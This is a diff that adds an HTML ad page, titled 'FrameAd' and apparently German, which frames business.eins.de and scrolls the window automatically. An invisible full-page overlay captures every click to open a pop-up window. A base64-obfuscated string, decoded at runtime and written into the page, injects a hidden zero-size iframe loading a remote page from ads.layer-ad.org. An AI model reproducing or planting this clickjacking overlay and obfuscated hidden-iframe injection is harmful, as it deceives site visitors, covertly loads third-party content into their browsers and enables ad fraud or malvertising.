@@ -1,0 +1,108 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Language" content="de" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>adServrSE_GeoNd - FrameAd</title>
+</head>
+<body style="padding:0; margin:0;">
+
+
+<div style="width: 2000px; height: 1000px; margin:0; padding:0; z-index:10000; border:0; overflow:hidden; position:absolute; top:0; left:0; text-align:left;" onclick="sj_winopen();"></div>
+	<iframe src="http://business.eins.de/" frameborder="0" frameborder="0" scrolling="No" style="border:0px;" width="1000" height="1000"></iframe>
+
+
+<script type="text/javascript">
+
+		var sj_startX=2;
+		var sj_startY=2;
+
+		var sj_posiX=sj_startX;
+		var sj_posiY=sj_startY;
+
+
+		var sj_scrollX=0;
+		var sj_scrollY=1;
+
+		var sj_maxX=400;
+		var sj_maxY=400;
+		var sj_minX=1;
+		var sj_minY=1;
+
+		var sj_speed=40;
+		var sj_way='+';
+
+		function sj_winopen(){
+			window.open('http://business.eins.de/');
+		}
+
+		function sj_ScrollTo(x,y){
+			x=parseInt(x);
+			y=parseInt(y);
+			window.scrollTo(x,y);
+			sj_posiX=x;
+			sj_posiY=y;
+			sj_scroll();
+		}
+
+		function sj_ScrollBy(x,y){
+			x=parseInt(x);
+			y=parseInt(y);
+			window.scrollBy(x,y);
+			sj_posiX+=x;
+			sj_posiY+=y;
+			sj_scroll();
+		}
+
+		function sj_StartAd()
+		{
+			sj_ScrollTo(sj_startX,sj_startY)
+		}
+
+		function sj_getLeft(){
+			if (document.all) {	return document.body.scrollLeft; } else { return window.pageXOffset; }
+		}
+
+		function sj_scroll(){
+
+			if(sj_posiX==sj_maxX || sj_posiY==sj_maxY || sj_posiX==sj_minX || sj_posiY==sj_minY){
+				if(sj_way=='+'){
+					sj_way='-';
+				} else {
+					sj_way='+';
+				}
+			}
+
+			window.setTimeout("sj_ScrollBy('"+sj_way+sj_scrollX+"','"+sj_way+sj_scrollY+"')",sj_speed);
+
+		}
+
+		sj_StartAd();
+
+		var strings = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+		function dcode(encStr){
+			var bits;
+			var decOut = '';
+			var i = 0;
+			for(; i<encStr.length; i += 4){
+				bits = (strings.indexOf(encStr.charAt(i))    & 0xff) <<18 |
+				(strings.indexOf(encStr.charAt(i +1)) & 0xff) <<12 |
+				(strings.indexOf(encStr.charAt(i +2)) & 0xff) << 6 |
+				strings.indexOf(encStr.charAt(i +3)) & 0xff;
+				decOut += String.fromCharCode((bits & 0xff0000) >>16,
+				(bits & 0xff00) >>8, bits & 0xff);
+			}
+			if(encStr.charCodeAt(i -2) == 61) {
+				return(decOut.substring(0, decOut.length -2));
+			} else if(encStr.charCodeAt(i -1) == 61) {
+				return(decOut.substring(0, decOut.length -1));
+			} else {
+				return(decOut);
+			}
+		}
+
+		document.write(dcode("PGlmcmFtZSBzcmM9Imh0dHA6Ly9hZHMubGF5ZXItYWQub3JnL180X2xheWVyLmh0bWwiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHN0eWxlPSJkaXNwbGF5Om5vbmU7IHdpZHRoOjA7aGVpZ2h0OjA7IiBmcmFtZWJvcmRlcj0iMCIgc2Nyb2xsaW5nPSJubyI+PC9pZnJhbWU+"));
+	</script>
+
+</body>
+</html>
